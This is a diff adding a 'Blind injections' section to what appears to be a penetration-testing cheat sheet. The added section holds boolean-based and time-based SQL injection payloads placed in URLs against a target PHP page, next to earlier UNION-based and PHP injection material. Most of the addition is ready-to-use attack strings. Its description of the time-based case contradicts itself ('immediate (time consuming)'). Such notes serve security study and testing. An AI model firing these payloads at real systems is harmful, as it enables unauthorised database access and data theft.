@@ -104,6 +104,20 @@ SELECT * from customers WHERE name LIKE '' union select null, table_name, column
 ```
 The `order by` injection retrieves the table size.
 
+#### Blind injections
+
+Boolean-based, the fake user query gives an empty output:
+```
+http://$TargetIp/blindsqli.php?user=trueuser' AND 1=1 -- //
+http://$TargetIp/blindsqli.php?user=fakeuser' AND 1=1 -- //
+```
+
+Time-based, the fake user response is immediate (time consuming):
+```
+http://$TargetIp/blindsqli.php?user=trueuser' AND IF (1=1, sleep(3),'false') -- //
+http://$TargetIp/blindsqli.php?user=fakeuser' AND IF (1=1, sleep(3),'false') -- //
+```
+
 #### Php injection
 
 Php injection in an `input` HTML field:
